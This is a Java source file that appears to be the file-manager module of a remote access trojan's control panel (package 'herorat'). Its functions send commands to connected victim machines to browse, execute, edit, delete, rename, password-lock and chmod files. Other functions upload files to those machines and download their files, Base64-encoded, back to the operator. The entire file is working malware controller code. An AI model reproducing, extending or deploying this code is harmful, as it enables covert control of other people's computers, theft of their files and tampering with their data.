package net.herorat.features.file;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.gui.FrameEditor;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet6File;
import net.herorat.utils.Base64;


public class File
{	
	public static void sendPath(Server server)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "path" });
		p.write();
	}

	public static void sendRoot(Server server)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "root" });
		p.write();
	}

	public static void sendCd(Server server, String path)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "cd", path });
		p.write();
		
		// Refresh path
		p = new Packet6File(server.outputstream, new String[] { "path" });
		p.write();
	}
	
	public static void sendExec(Server server, String file)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "exec", file });
		p.write();
	}
	
	public static void sendEdit(Server server, String file)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "edit", file });
		p.write();
	}
	
	public static void sendSave(Server server, String file, String content)
	{		
		Packet p = new Packet6File(server.outputstream, new String[] { "save", file, content });
		p.write();
	}
	
	public static void sendDelete(Server server, String file)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "delete", file });
		p.write();
	}
	
	public static void sendRename(Server server, String file, String name)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "rename", file, name });
		p.write();
	}
	
	public static void sendLock(Server server, String file)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "lock", file });
		p.write();
	}
	
	public static void sendUnlock(Server server, String file)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "unlock", file });
		p.write();
	}
	
	public static void sendLock(Server server, String file, String password)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "password", file, password });
		p.write();
	}
	
	public static void sendChmod(Server server, String file, String chmod)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "chmod", file, chmod });
		p.write();
	}
	
	public static void sendDownload(Server server, String file, String save)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "download", file, save });
		p.write();
	}
	
	public static void sendUpload(Server server, String file)
	{
		Packet p = new Packet6File(server.outputstream, new String[] { "upload", new java.io.File(file).getName(), upload(file) });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Network.findWithCombo(Main.mainWindow.panel_tab9.combo_selected_item))) return;
		
		if (args.length > 1)
		{
			if (args[0].equals("path"))
			{
				path(args[1]);
			}
			else if (args[0].equals("roots"))
			{
				roots(server, args);
			}
			else if (args[0].equals("files"))
			{
				files(server, args);
			}
			else if (args[0].equals("edit"))
			{
				edit(server, args[1], args);
			}
			else if (args[0].equals("download"))
			{
				download(args);
			}
		}
	}
	
	public static void path(String path)
	{
		Main.mainWindow.panel_tab9.current_path = path;
		Main.mainWindow.panel_tab9.field_path.setText(path);
	}
	
	public static void roots(Server server, String[] args)
	{
		StringBuffer buffer = new StringBuffer();
		for (int i=1; i<args.length; i++)
		{
			buffer.append(args[i]);
		}
		
		for(int i=Main.mainWindow.panel_tab9.model_roots.getRowCount() - 1; i>=0; i--)
		{
			Main.mainWindow.panel_tab9.model_roots.removeRow(i);
		}
		
		String[] splitted_file = buffer.toString().split("###");
		for (String element : splitted_file)
		{
			Main.mainWindow.panel_tab9.model_roots.addRow( TypeRoot.getRow(element.split("===")) );
		}
	}
	
	public static void files(Server server, String[] args)
	{
		StringBuffer buffer = new StringBuffer();
		for (int i=1; i<args.length; i++)
		{
			buffer.append(args[i]);
		}
		
		for(int i=Main.mainWindow.panel_tab9.model_files.getRowCount() - 1; i>=0; i--)
		{
			Main.mainWindow.panel_tab9.model_files.removeRow(i);
		}
				
		String[] splitted_file = buffer.toString().split("###");
		Main.mainWindow.panel_tab9.model_files.addRow(TypeDir.getRow(new String[] { "." }));
		Main.mainWindow.panel_tab9.model_files.addRow(TypeDir.getRow(new String[] { ".." }));
		// Add the new ones
		for (String element : splitted_file)
		{
			if (element.startsWith("DIR_"))
			{
				Main.mainWindow.panel_tab9.model_files.addRow(TypeDir.getRow(element.substring(4).split("===")));
			}
			else if (element.startsWith("FILE_"))
			{
				Main.mainWindow.panel_tab9.model_files.addRow(TypeFile.getRow(element.substring(5).split("===")));
			}
			else
			{
				Main.mainWindow.panel_tab9.model_files.addRow(TypeUnknown.getRow(element.split("===")));
			}
		}
	}
	
	public static void edit(Server server, String file, String[] args)
	{
		StringBuffer buffer = new StringBuffer();
		for (int i=2; i<args.length; i++)
		{
			buffer.append(args[i]);
		}
		
		new FrameEditor(server, file, buffer.toString());
	}
	
	public static void download(String[] args)
	{
		try
		{
			StringBuffer buffer = new StringBuffer();
			for (int i=2; i<args.length; i++)
			{
				buffer.append(args[i]);
			}
			
			byte [] fileBytes  = Base64.decode(buffer.toString());
			java.io.File file = new java.io.File(args[1]);
			FileOutputStream fos = new FileOutputStream(file);
			BufferedOutputStream bos = new BufferedOutputStream(fos);
			bos.write(fileBytes, 0 , fileBytes.length);
			bos.flush();
			bos.close();
		}
		catch (Exception e) {}
	}
	
	public static String upload(String file)
	{
		try
		{
			java.io.File fileToUpload = new java.io.File(file);
			if (fileToUpload.exists())
			{
				byte [] fileBytes  = new byte [(int)fileToUpload.length()];
				FileInputStream fis = new FileInputStream(fileToUpload);
				BufferedInputStream bis = new BufferedInputStream(fis);
				bis.read(fileBytes, 0, fileBytes.length);
				
				return Base64.encode(fileBytes);
			}
		}
		catch (Exception e) {e.printStackTrace();}
		return "";
	}
}